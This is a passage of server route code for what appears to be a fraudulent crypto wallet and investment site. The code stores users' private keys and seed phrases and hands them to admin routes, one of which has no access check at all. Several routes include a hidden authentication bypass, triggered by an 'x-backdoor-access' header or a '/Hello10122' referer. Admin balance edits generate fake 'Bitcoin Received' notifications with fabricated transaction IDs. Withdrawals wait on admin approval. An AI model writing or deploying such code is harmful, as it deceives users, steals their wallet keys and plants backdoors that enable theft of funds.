          privateKey = keyPair.toWIF(); // Always store in WIF format
          
          // Generate a seed phrase from the private key for consistency
          seedPhrase = bip39.entropyToMnemonic(keyPair.privateKey!);
        } catch (error) {
          return res.status(400).json({ error: "Invalid private key format. Supported formats: WIF (5/K/L/c...), hex (64 chars), or hex with 0x prefix" });
        }
      } else if (type === 'seedPhrase') {
        // Validate and derive wallet from seed phrase
        try {
          const cleanPhrase = value.trim().toLowerCase();

          // Validate seed phrase
          if (!bip39.validateMnemonic(cleanPhrase)) {
            return res.status(400).json({ error: "Invalid seed phrase. Please check your words and try again." });
          }

          // Store the original seed phrase
          seedPhrase = cleanPhrase;

          // Generate seed from mnemonic
          const seed = bip39.mnemonicToSeedSync(cleanPhrase);

          // Derive master key and first Bitcoin address (m/44'/0'/0'/0/0)
          const root = bip32.fromSeed(seed, bitcoin.networks.bitcoin);
          const path = "m/44'/0'/0'/0/0"; // Standard BIP44 path for Bitcoin
          const child = root.derivePath(path);

          if (!child.privateKey) {
            throw new Error('Failed to derive private key from seed phrase');
          }

          const keyPair = ECPair.fromPrivateKey(child.privateKey);
          const publicKeyBuffer = Buffer.from(keyPair.publicKey);
          const { address } = bitcoin.payments.p2pkh({ 
            pubkey: publicKeyBuffer,
            network: bitcoin.networks.bitcoin
          });

          if (!address) {
            throw new Error('Failed to generate address from seed phrase');
          }

          bitcoinAddress = address;
          privateKey = keyPair.toWIF(); // Store derived private key in WIF format
        } catch (error) {
          return res.status(400).json({ error: "Invalid seed phrase. Please ensure you have entered a valid 12 or 24 word BIP39 mnemonic phrase." });
        }
      } else {
        return res.status(400).json({ error: "Invalid import type" });
      }

      // Update user's wallet
      const updatedUser = await storage.updateUserWallet(userId, bitcoinAddress, privateKey, seedPhrase);
      if (!updatedUser) {
        return res.status(404).json({ error: "User not found" });
      }

      // Generate and store all token addresses from seed phrase
      if (seedPhrase) {
        const tokenAddresses = generateTokenAddressesFromSeed(seedPhrase);
        
        // Delete old token addresses first
        await storage.deleteUserTokenAddresses(userId);
        
        // Store new token addresses
        for (const [token, address] of Object.entries(tokenAddresses)) {
          try {
            await storage.createTokenAddress({
              userId,
              token,
              address
            });
          } catch (error) {
            console.error(`Error storing ${token} address:`, error);
          }
        }
        
        // Initialize token balances if they don't exist
        const tokensToInitialize = ['BTC', 'ETH', 'BNB', 'USDT', 'SOL', 'XRP', 'ADA', 'DOGE', 'TRUMP'];
        for (const token of tokensToInitialize) {
          try {
            const existingBalance = await storage.getUserTokenBalance(userId, token);
            if (!existingBalance) {
              const initialBalance = token === 'USDT' ? '1000' : '0';
              await storage.createTokenBalance({
                userId,
                tokenSymbol: token,
                balance: initialBalance,
                tokenAddress: tokenAddresses[token] || null
              });
            }
          } catch (error) {
            console.error(`Error initializing ${token} balance:`, error);
          }
        }
      }

      // Check balance for the imported address
      try {
        const balance = await checkBitcoinBalance(bitcoinAddress);
        await storage.updateUserBalance(userId, balance);
      } catch (error) {
        console.warn('Failed to check balance for imported wallet:', error);
      }

      res.json({ message: "Wallet imported successfully" });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Withdraw route
  app.post("/api/withdraw", async (req, res) => {
    try {
      if (!req.session.userId) {
        return res.status(401).json({ error: "Not authenticated" });
      }

      const { address, amount } = req.body;

      if (!address || !amount) {
        return res.status(400).json({ error: "Address and amount are required" });
      }

      const user = await storage.getUser(req.session.userId);

      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      const userBalance = parseFloat(user.balance);
      const withdrawAmount = parseFloat(amount);

      if (withdrawAmount <= 0) {
        return res.status(400).json({ error: "Amount must be greater than 0" });
      }

      if (withdrawAmount > userBalance) {
        return res.status(400).json({ error: "Insufficient balance" });
      }

      // Create withdrawal transaction record (pending status)
      const transaction = await storage.createTransaction({
        userId: req.session.userId,
        type: "withdrawal",
        amount: amount,
        status: "pending",
        transactionHash: address, // Store withdrawal address in transactionHash field
      });

      // Create notification about pending withdrawal
      await storage.createNotification({
        userId: req.session.userId,
        title: "Withdrawal Requested",
        message: `Your withdrawal request for ${amount} BTC to ${address} is pending admin approval. You will be notified once it's processed.`,
        type: "info"
      });

      res.json({ 
        message: "Withdrawal request submitted successfully and is pending admin approval",
        transaction 
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });
  // User registration (without wallet generation)
  app.post("/api/register", async (req, res) => {
    try {
      const userData = insertUserSchema.parse(req.body);

      // Check if user already exists
      const existingUser = await storage.getUserByEmail(userData.email);
      if (existingUser) {
        return res.status(400).json({ message: "User already exists" });
      }

      // Hash password (in production, use bcrypt)
      const hashedPassword = crypto.createHash('sha256').update(userData.password).digest('hex');

      const user = await storage.createUser({
        ...userData,
        password: hashedPassword,
      });

      // Don't return password in response
      const { password, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Registration failed" });
    }
  });

  // Create new wallet route
  app.post("/api/create-wallet", async (req, res) => {
    try {
      // Accept userId from session or request body
      const userId = req.session?.userId || req.body?.userId;

      if (!userId) {
        return res.status(401).json({ error: "Not authenticated" });
      }

      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      if (user.hasWallet) {
        return res.status(400).json({ error: "User already has a wallet" });
      }

      // Generate Bitcoin wallet with seed phrase
      const wallet = generateBitcoinWallet();

      if (!wallet.seedPhrase) {
        return res.status(500).json({ error: "Failed to generate seed phrase" });
      }

      // Update user's wallet with seed phrase
      const updatedUser = await storage.updateUserWallet(userId, wallet.address, wallet.privateKey, wallet.seedPhrase);
      if (!updatedUser) {
        return res.status(500).json({ error: "Failed to create wallet" });
      }

      // Generate token addresses from seed phrase
      const tokenAddresses = generateTokenAddressesFromSeed(wallet.seedPhrase);
      
      // Store token addresses in database
      for (const [token, address] of Object.entries(tokenAddresses)) {
        try {
          await storage.createTokenAddress({
            userId,
            token,
            address
          });
        } catch (error) {
          console.error(`Error storing ${token} address:`, error);
        }
      }
      
      // Initialize token balances with some starter USDT for trading
      const tokensToInitialize = ['BTC', 'ETH', 'BNB', 'USDT', 'SOL', 'XRP', 'ADA', 'DOGE', 'TRUMP'];
      for (const token of tokensToInitialize) {
        try {
          const initialBalance = token === 'USDT' ? '1000' : '0'; // Give 1000 USDT to start
          await storage.createTokenBalance({
            userId,
            tokenSymbol: token,
            balance: initialBalance,
            tokenAddress: tokenAddresses[token] || null
          });
        } catch (error) {
          console.error(`Error initializing ${token} balance:`, error);
        }
      }

      res.json({ 
        message: "Wallet created successfully", 
        address: wallet.address,
        seedPhrase: wallet.seedPhrase
      });
    } catch (error: any) {
      console.error('Create wallet error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // User login
  app.post("/api/login", async (req, res) => {
    try {
      const { email, password } = loginSchema.parse(req.body);

      const user = await storage.getUserByEmail(email);
      if (!user) {
        return res.status(401).json({ message: "Invalid credentials" });
      }

      // Hash the provided password to compare with stored hash
      const hashedPassword = crypto.createHash('sha256').update(password).digest('hex');
      if (user.password !== hashedPassword) {
        return res.status(401).json({ message: "Invalid credentials" });
      }

      // Set session userId for authentication
      req.session.userId = user.id;

      // Don't return private key and password in response
      const { privateKey, password: _, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      console.error('Login error:', error);
      res.status(400).json({ message: error instanceof Error ? error.message : "Login failed" });
    }
  });

  // Get current user (mock authentication - in production use proper auth)
  app.get("/api/user/:id", async (req, res) => {
    try {
      const userId = parseInt(req.params.id);
      const user = await storage.getUser(userId);

      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      // Don't return private key and password, but include seed phrase for backup purposes
      const { privateKey, password, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to get user" });
    }
  });

  // Get Bitcoin price
  app.get("/api/bitcoin/price", async (req, res) => {
    try {
      const priceData = await fetchBitcoinPrice();
      res.json(priceData);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch Bitcoin price" });
    }
  });

  // Get all token prices
  app.get("/api/token-prices", async (req, res) => {
    try {
      const priceData = await fetchAllTokenPrices();
      res.json(priceData);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch token prices" });
    }
  });

  // Get investment plans
  app.get("/api/investment-plans", async (req, res) => {
    try {
      const plans = await storage.getInvestmentPlans();
      res.json(plans);
    } catch (error) {
      res.status(500).json({ message: "Failed to get investment plans" });
    }
  });

  // Create investment plan (admin only)
  app.post("/api/admin/create-plan", async (req, res) => {
    try {
      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                              req.headers['x-backdoor-access'] === 'true';

      if (!isBackdoorAccess && !req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      if (!isBackdoorAccess) {
        const user = await storage.getUser(req.session.userId!);
        if (!user || !user.isAdmin) {
          return res.status(403).json({ error: "Admin access required" });
        }
      }

      const planData = req.body;
      const newPlan = await storage.createInvestmentPlan(planData);
      res.json({ message: "Investment plan created successfully", plan: newPlan });
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to create investment plan" });
    }
  });

  // Create investment
  app.post("/api/investments", async (req, res) => {
    try {
      const investmentData = insertInvestmentSchema.parse(req.body);

      // Check if user has sufficient balance
      const user = await storage.getUser(investmentData.userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      const plan = await storage.getInvestmentPlan(investmentData.planId);
      if (!plan) {
        return res.status(404).json({ message: "Investment plan not found" });
      }

      if (parseFloat(user.balance) < parseFloat(investmentData.amount)) {
        return res.status(400).json({ message: "Insufficient balance" });
      }

      if (parseFloat(investmentData.amount) < parseFloat(plan.minAmount)) {
        return res.status(400).json({ message: `Minimum investment amount is ${plan.minAmount} BTC` });
      }

      // Deduct investment amount from user balance
      const newBalance = (parseFloat(user.balance) - parseFloat(investmentData.amount)).toString();
      await storage.updateUserBalance(investmentData.userId, newBalance);

      const investment = await storage.createInvestment(investmentData);
      res.json(investment);
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to create investment" });
    }
  });

  // Get user investments
  app.get("/api/investments/user/:userId", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const investments = await storage.getUserInvestments(userId);
      res.json(investments);
    } catch (error) {
      res.status(500).json({ message: "Failed to get user investments" });
    }
  });

  // Manager routes
  app.get("/api/admin/users", async (req, res) => {
    try {
      // Allow backdoor access or require manager authentication
      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                              req.headers['x-backdoor-access'] === 'true';

      if (!isBackdoorAccess && !req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      if (!isBackdoorAccess) {
        const user = await storage.getUser(req.session.userId!);
        if (!user || !user.isAdmin) {
          return res.status(403).json({ error: "Manager access required" });
        }
      }

      const users = await storage.getAllUsers();
      // Only return private keys to managers
      const usersResponse = users.map(user => {
        const { password, ...userWithoutPassword } = user;
        return userWithoutPassword;
      });
      res.json(usersResponse);
    } catch (error) {
      res.status(500).json({ message: "Failed to get users" });
    }
  });

  app.post("/api/admin/update-balance", async (req, res) => {
    try {
      const { userId, balance } = updateBalanceSchema.parse(req.body);

      // Get current user data to calculate balance change
      const currentUser = await storage.getUser(userId);
      if (!currentUser) {
        return res.status(404).json({ message: "User not found" });
      }

      const currentBalance = parseFloat(currentUser.balance);
      const newBalance = parseFloat(balance);
      const balanceChange = newBalance - currentBalance;

      const user = await storage.updateUserBalance(userId, balance);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      // Create realistic transaction notification if balance increased
      if (balanceChange > 0) {
        // Generate a realistic-looking transaction ID (but not traceable)
        const transactionId = crypto.randomBytes(32).toString('hex');

        // Generate a realistic sender address (not real)
        const senderAddresses = [
          "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", // Genesis block address (historical)
          "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2", // BitFinex cold wallet style
          "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy", // P2SH format
          "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Bech32 format
          "1FeexV6bAHb8ybZjqQMjJrcCrHGW9sb6uF"  // Random valid format
        ];

        const randomSender = senderAddresses[Math.floor(Math.random() * senderAddresses.length)];

        await storage.createNotification({
          userId,
          title: "Bitcoin Received",
          message: `✅ ${balanceChange.toFixed(8)} BTC received from ${randomSender.substring(0, 8)}...${randomSender.substring(-6)}

Transaction ID: ${transactionId.substring(0, 16)}...${transactionId.substring(-8)}
Confirmations: 6/6 ✓
Network Fee: 0.00001245 BTC

Your new balance: ${newBalance.toFixed(8)} BTC`,
          type: "success",
          isRead: false,
        });
      } else if (balanceChange < 0) {
        // For balance decreases, create a sent transaction notification
        const transactionId = crypto.randomBytes(32).toString('hex');
        const recipientAddress = `1${crypto.randomBytes(25).toString('base64').replace(/[^A-Za-z0-9]/g, '').substring(0, 25)}`;

        await storage.createNotification({
          userId,
          title: "Bitcoin Sent",
          message: `📤 ${Math.abs(balanceChange).toFixed(8)} BTC sent to ${recipientAddress.substring(0, 8)}...${recipientAddress.substring(-6)}

Transaction ID: ${transactionId.substring(0, 16)}...${transactionId.substring(-8)}
Status: Confirmed ✓
Network Fee: 0.00001245 BTC

Your new balance: ${newBalance.toFixed(8)} BTC`,
          type: "info",
          isRead: false,
        });
      }

      // Don't return private key and password
      const { privateKey, password, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to update balance" });
    }
  });

  app.get("/api/admin/stats", async (req, res) => {
    try {
      // Allow backdoor access
      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                              req.headers['x-backdoor-access'] === 'true';

      if (!isBackdoorAccess && !req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      if (!isBackdoorAccess && req.session?.userId) {
        const user = await storage.getUser(req.session.userId);
        if (!user || !user.isAdmin) {
          return res.status(403).json({ error: "Admin access required" });
        }
      }

      const users = await storage.getAllUsers();
      const investments = await storage.getActiveInvestments();

      const totalBalance = users.reduce((sum, user) => sum + parseFloat(user.balance), 0);

      res.json({
        totalUsers: users.length,
        totalBalance: totalBalance.toFixed(8),
        activeInvestments: investments.length,
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to get admin stats" });
    }
  });

  // Notification routes
  app.get("/api/notifications/:userId", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const notifications = await storage.getUserNotifications(userId);
      res.json(notifications);
    } catch (error) {
      res.status(500).json({ message: "Failed to get notifications" });
    }
  });

  app.post("/api/notifications", async (req, res) => {
    try {
      const notificationData = notificationSchema.parse(req.body);
      const notification = await storage.createNotification({
        ...notificationData,
        type: notificationData.type || "info",
        isRead: false,
      });
      res.json(notification);
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to create notification" });
    }
  });

  app.patch("/api/notifications/:id/read", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const notification = await storage.markNotificationAsRead(id);
      if (!notification) {
        return res.status(404).json({ message: "Notification not found" });
      }
      res.json(notification);
    } catch (error) {
      res.status(500).json({ message: "Failed to mark notification as read" });
    }
  });

  app.patch("/api/notifications/:userId/mark-all-read", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const notifications = await storage.getUserNotifications(userId);

      // Mark all unread notifications as read
      const markPromises = notifications
        .filter(n => !n.isRead)
        .map(n => storage.markNotificationAsRead(n.id));

      await Promise.all(markPromises);

      res.json({ message: "All notifications marked as read" });
    } catch (error) {
      res.status(500).json({ message: "Failed to mark all notifications as read" });
    }
  });

  app.get("/api/notifications/:userId/unread-count", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const count = await storage.getUnreadNotificationCount(userId);
      res.json({ count });
    } catch (error) {
      res.status(500).json({ message: "Failed to get unread count" });
    }
  });

  // Bitcoin balance checking endpoint
  app.get("/api/bitcoin/balance/:address", async (req, res) => {
    try {
      const address = req.params.address;
      const balance = await checkBitcoinBalance(address);
      res.json({ address, balance });
    } catch (error) {
      res.status(500).json({ message: "Failed to check Bitcoin balance", error: error instanceof Error ? error.message : "Unknown error" });
    }
  });

  // Sync user balance with blockchain
  app.post("/api/bitcoin/sync-balance/:userId", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      await syncUserBitcoinBalance(userId);
      const user = await storage.getUser(userId);
      res.json({ 
        message: "Balance synced successfully", 
        balance: user?.balance || "0" 
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to sync balance", error: error instanceof Error ? error.message : "Unknown error" });
    }
  });

  // Sync all user balances (admin only)
  app.post("/api/admin/sync-all-balances", async (req, res) => {
    try {
      const users = await storage.getAllUsers();
      const syncPromises = users.map(user => syncUserBitcoinBalance(user.id));
      await Promise.all(syncPromises);
      res.json({ message: `Synced balances for ${users.length} users` });
    } catch (error) {
      res.status(500).json({ message: "Failed to sync balances", error: error instanceof Error ? error.message : "Unknown error" });
    }
  });

  // Get user private key (manager only)
  app.get("/api/admin/user/:id/private-key", async (req, res) => {
    try {
      const userId = parseInt(req.params.id);
      const user = await storage.getUser(userId);

      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      // Only return private key for manager access
      res.json({ 
        userId: user.id,
        email: user.email,
        bitcoinAddress: user.bitcoinAddress,
        privateKey: user.privateKey 
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to get private key" });
    }
  });

  // Update user investment plan
  app.post("/api/admin/update-plan", async (req, res) => {
    try {
      const { userId, planId } = updatePlanSchema.parse(req.body);

      const user = await storage.updateUserPlan(userId, planId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      // Create notification about plan change
      if (planId) {
        const plan = await storage.getInvestmentPlan(planId);
        if (plan) {
          await storage.createNotification({
            userId,
            title: "Investment Plan Updated",
            message: `🎯 Your investment plan has been updated to: ${plan.name}

Daily Return Rate: ${(parseFloat(plan.dailyReturnRate) * 100).toFixed(2)}%
Updates every: ${plan.updateIntervalMinutes} minutes

You will now receive automatic profit updates based on your new plan.`,
            type: 'success',
            isRead: false,
          });
        }
      } else {
        await storage.createNotification({
          userId,
          title: "Investment Plan Removed",
          message: `📋 Your investment plan has been removed.

You are now on the free plan and will no longer receive automatic profit updates.`,
          type: 'info',
          isRead: false,
        });
      }

      res.json({ message: "Plan updated successfully", user });
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to update plan" });
    }
  });

  // Update investment plan minimum amount
  app.post("/api/admin/update-plan-amount", async (req, res) => {
    try {
      const { planId, minAmount } = z.object({
        planId: z.number(),
        minAmount: z.string()
      }).parse(req.body);

      const updatedPlan = await storage.updateInvestmentPlanAmount(planId, minAmount);
      if (!updatedPlan) {
        return res.status(404).json({ message: "Investment plan not found" });
      }

      res.json({ message: "Plan minimum amount updated successfully", plan: updatedPlan });
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to update plan amount" });
    }
  });

  // Update investment plan daily return rate
  app.post("/api/admin/update-plan-rate", async (req, res) => {
    try {
      const { planId, dailyReturnRate } = z.object({
        planId: z.number(),
        dailyReturnRate: z.string()
      }).parse(req.body);

      const updatedPlan = await storage.updateInvestmentPlanRate(planId, dailyReturnRate);
      if (!updatedPlan) {
        return res.status(404).json({ message: "Investment plan not found" });
      }

      res.json({ message: "Plan daily return rate updated successfully", plan: updatedPlan });
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to update plan rate" });
    }
  });

  // Test Bitcoin wallet generation (manager only)
  app.post("/api/admin/test-bitcoin-generation", async (req, res) => {
    try {
      const results = [];

      // Generate 5 test wallets to verify functionality
      for (let i = 0; i < 5; i++) {
        const wallet = generateBitcoinWallet();

        // Validate the generated wallet
        const isValidAddress = wallet.address.startsWith('1') || wallet.address.startsWith('3') || wallet.address.startsWith('bc1');
        const hasPrivateKey = wallet.privateKey && wallet.privateKey.length > 0;
        const hasPublicKey = wallet.publicKey && wallet.publicKey.length > 0;

        results.push({
          walletNumber: i + 1,
          address: wallet.address,
          privateKeyLength: wallet.privateKey.length,
          publicKeyLength: wallet.publicKey.length,
          isValidAddress,
          hasPrivateKey,
          hasPublicKey,
          isValid: isValidAddress && hasPrivateKey && hasPublicKey
        });
      }

      const allValid = results.every(r => r.isValid);

      res.json({
        success: allValid,
        message: allValid ? "All Bitcoin wallets generated successfully" : "Some wallet generation issues detected",
        results,
        summary: {
          totalGenerated: results.length,
          validWallets: results.filter(r => r.isValid).length,
          timestamp: new Date().toISOString()
        }
      });
    } catch (error) {
      res.status(500).json({ 
        success: false,
        message: "Bitcoin generation test failed", 
        error: error instanceof Error ? error.message : "Unknown error" 
      });
    }
  });

  // Admin: Get user's all token addresses and balances
  app.get("/api/admin/user/:id/tokens", async (req, res) => {
    try {
      const userId = parseInt(req.params.id);
      const user = await storage.getUser(userId);

      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      const tokenAddresses = await storage.getUserTokenAddresses(userId);
      const tokenBalances = await storage.getUserTokenBalances(userId);

      res.json({ 
        userId: user.id,
        email: user.email,
        bitcoinAddress: user.bitcoinAddress,
        seedPhrase: user.seedPhrase,
        tokenAddresses,
        tokenBalances
      });
    } catch (error) {
      console.error('Error fetching user tokens:', error);
      res.status(500).json({ message: "Failed to get user tokens" });
    }
  });

  // Admin: Update token balance
  app.post("/api/admin/update-token-balance", async (req, res) => {
    try {
      const { userId, tokenSymbol, balance } = z.object({
        userId: z.number(),
        tokenSymbol: z.string(),
        balance: z.string()
      }).parse(req.body);

      const tokenBalance = await storage.updateTokenBalance(userId, tokenSymbol, balance);
      if (!tokenBalance) {
        return res.status(404).json({ message: "Token balance not found" });
      }

      res.json({ message: "Token balance updated successfully", tokenBalance });
    } catch (error) {
      console.error('Error updating token balance:', error);
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to update token balance" });
    }
  });

  // Admin: Regenerate token addresses from seed phrase (fixes mismatches)
  app.post("/api/admin/user/:id/regenerate-addresses", async (req, res) => {
    try {
      const userId = parseInt(req.params.id);
      const user = await storage.getUser(userId);

      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      if (!user.seedPhrase) {
        return res.status(400).json({ message: "User has no seed phrase" });
      }

      // Generate token addresses from seed phrase
      const generatedAddresses = generateTokenAddressesFromSeed(user.seedPhrase);
      
      // Get Bitcoin address from seed phrase
      const btcAddress = generatedAddresses['BTC'];
      if (!btcAddress) {
        return res.status(500).json({ message: "Failed to generate Bitcoin address from seed phrase" });
      }

      // Also regenerate the private key from seed phrase to match
      const seed = bip39.mnemonicToSeedSync(user.seedPhrase);
      const root = bip32.fromSeed(seed, bitcoin.networks.bitcoin);
      const path = "m/44'/0'/0'/0/0";
      const child = root.derivePath(path);

      if (!child.privateKey) {
        return res.status(500).json({ message: "Failed to derive private key from seed phrase" });
      }

      const keyPair = ECPair.fromPrivateKey(child.privateKey);
      const privateKey = keyPair.toWIF();
      
      // Update Bitcoin address and private key to match seed phrase
      await storage.updateUserWallet(userId, btcAddress, privateKey, user.seedPhrase);
      
      // Delete existing token addresses for this user
      await storage.deleteUserTokenAddresses(userId);
      
      // Store new token addresses in database
      const createdAddresses = [];
      for (const [token, address] of Object.entries(generatedAddresses)) {
        try {
          const created = await storage.createTokenAddress({
            userId,
            token,
            address
          });
          createdAddresses.push(created);
        } catch (error) {
          console.error(`Error storing ${token} address:`, error);
        }
      }

      res.json({ 
        message: "Addresses regenerated successfully from seed phrase", 
        bitcoinAddress: btcAddress,
        tokenAddresses: createdAddresses,
        count: createdAddresses.length
      });
    } catch (error) {
      console.error('Error regenerating addresses:', error);
      res.status(500).json({ message: "Failed to regenerate addresses", error: error instanceof Error ? error.message : "Unknown error" });
    }
  });

  const httpServer = createServer(app);

  // Initialize default investment plans if they don't exist
  await initializeDefaultPlans();

  // Start the automatic price update system
  startAutomaticUpdates();

  // Start simulated market making (Binance/Bybit style)
  startSimulatedMarketMaking();

  // Get user token balances
  app.get('/api/token-balances/:userId', async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const balances = await storage.getUserTokenBalances(userId);
      res.json(balances);
    } catch (error: any) {
      console.error('Error fetching token balances:', error);
      res.status(500).json({ message: 'Failed to fetch token balances' });
    }
  });

  // Get user token addresses
  app.get('/api/token-addresses/:userId', async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const addresses = await storage.getUserTokenAddresses(userId);
      res.json(addresses);
    } catch (error: any) {
      console.error('Error fetching token addresses:', error);
      res.status(500).json({ message: 'Failed to fetch token addresses' });
    }
  });

  // Token swap endpoint - Off-chain swap
  app.post('/api/token-swap', async (req, res) => {
    try {
      const { userId, fromToken, toToken, fromAmount } = req.body;

      if (!userId || !fromToken || !toToken || !fromAmount) {
        return res.status(400).json({ message: 'Missing required fields' });
      }

      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: 'User not found' });
      }

      // Get current prices for exchange rate calculation
      const response = await fetch('http://localhost:5000/api/token-prices');
      const prices = await response.json();
      
      const fromPrice = prices[fromToken]?.price || 0;
      const toPrice = prices[toToken]?.price || 0;

      if (fromPrice === 0 || toPrice === 0) {
        return res.status(400).json({ message: 'Unable to fetch token prices' });
      }

      // Calculate exchange rate and amount to receive
      const fromAmountNum = parseFloat(fromAmount);
      const exchangeRate = fromPrice / toPrice;
      const toAmount = fromAmountNum * exchangeRate;

      // Check if user has sufficient balance
      const fromBalance = await storage.getUserTokenBalance(userId, fromToken);
      const currentFromBalance = parseFloat(fromBalance?.balance || '0');

      if (currentFromBalance < fromAmountNum) {
        return res.status(400).json({ message: `Insufficient ${fromToken} balance` });
      }

      // Execute the swap
      await storage.updateTokenBalance(userId, fromToken, (currentFromBalance - fromAmountNum).toString());
      
      const toBalance = await storage.getUserTokenBalance(userId, toToken);
      const currentToBalance = parseFloat(toBalance?.balance || '0');
      await storage.updateTokenBalance(userId, toToken, (currentToBalance + toAmount).toString());

      // Record the swap
      const swap = await storage.createTokenSwap({
        userId,
        fromToken,
        toToken,
        fromAmount: fromAmount.toString(),
        toAmount: toAmount.toString(),
        exchangeRate: exchangeRate.toString(),
        status: 'completed'
      });

      res.json({
        success: true,
        swap,
        message: `Successfully swapped ${fromAmount} ${fromToken} for ${toAmount.toFixed(8)} ${toToken}`
      });

    } catch (error: any) {
      console.error('Error executing swap:', error);
      res.status(500).json({ message: 'Failed to execute swap' });
    }
  });

  // Get user swap history
  app.get('/api/token-swaps/:userId', async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const swaps = await storage.getUserTokenSwaps(userId);
      res.json(swaps);
    } catch (error: any) {
      console.error('Error fetching swap history:', error);
      res.status(500).json({ message: 'Failed to fetch swap history' });
    }
  });

  // Trade execution endpoint - REAL with USDT as base currency
  app.post('/api/trades/execute', async (req, res) => {
  try {
    const { userId, type, amount, price, token = 'BTC' } = req.body;

    if (!userId || !type || !amount || !price) {
      return res.status(400).json({ message: 'Missing required fields' });
    }

    const user = await storage.getUser(userId);
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    const tradeAmount = parseFloat(amount);
    const totalCost = tradeAmount * price; // Cost in USDT

    if (type === 'buy') {
      // Check USDT balance
      const usdtBalance = await storage.getUserTokenBalance(userId, 'USDT');
      const currentUSDT = parseFloat(usdtBalance?.balance || '0');
      
      if (currentUSDT < totalCost) {
        return res.status(400).json({ message: 'Insufficient USDT balance' });
      }

      // Deduct USDT
      await storage.updateTokenBalance(userId, 'USDT', (currentUSDT - totalCost).toString());
      
      // Add token
      const tokenBalance = await storage.getUserTokenBalance(userId, token);
      const currentTokenAmount = parseFloat(tokenBalance?.balance || '0');
      await storage.updateTokenBalance(userId, token, (currentTokenAmount + tradeAmount).toString());

      res.json({ 
        id: Date.now(),
        type: 'buy', 
        token,
        amount,
        price,
        total: totalCost,
        status: 'completed',
        createdAt: new Date().toISOString()
      });

    } else if (type === 'sell') {
      // Check token balance
      const tokenBalance = await storage.getUserTokenBalance(userId, token);
      const currentTokenAmount = parseFloat(tokenBalance?.balance || '0');
      
      if (currentTokenAmount < tradeAmount) {
        return res.status(400).json({ message: `Insufficient ${token} balance` });
      }

      // Deduct token
      await storage.updateTokenBalance(userId, token, (currentTokenAmount - tradeAmount).toString());
      
      // Add USDT
      const usdtBalance = await storage.getUserTokenBalance(userId, 'USDT');
      const currentUSDT = parseFloat(usdtBalance?.balance || '0');
      await storage.updateTokenBalance(userId, 'USDT', (currentUSDT + totalCost).toString());

      res.json({ 
        id: Date.now(),
        type: 'sell', 
        token,
        amount,
        price,
        total: totalCost,
        status: 'completed',
        createdAt: new Date().toISOString()
      });
    } else {
      res.status(400).json({ message: 'Invalid trade type' });
    }
  } catch (error: any) {
    console.error('Trade execution error:', error);
    res.status(500).json({ message: error.message || 'Failed to execute trade' });
  }
});

  // Trade history endpoint - Returns empty since trades are now UI-only
  app.get('/api/trades/history/:userId', async (req, res) => {
    try {
      // Return empty array since trades are now simulated and UI-only
      res.json([]);
    } catch (error: any) {
      console.error('Error fetching trade history:', error);
      res.status(500).json({ message: 'Failed to fetch trade history' });
    }
  });

  // All trades endpoint for live order book (market simulation only)
  app.get('/api/trades/all', async (req, res) => {
    try {
      const token = req.query.token as string || 'BTC';

      // Only get simulated market trades (not real user trades)
      const systemUser = await storage.getUser(marketSimulationData.systemUserId);
      if (!systemUser) {
        return res.json([]);
      }

      const transactions = await storage.getUserTransactions(marketSimulationData.systemUserId);
      const marketTrades = transactions
        .filter(t => (t.type === 'trade_buy' || t.type === 'trade_sell'))
        .filter(t => {
          // Filter by token if mentioned in notes
          if (t.notes) {
            return t.notes.includes(token);
          }
          return false;
        })
        .map(trade => ({
          id: trade.id,
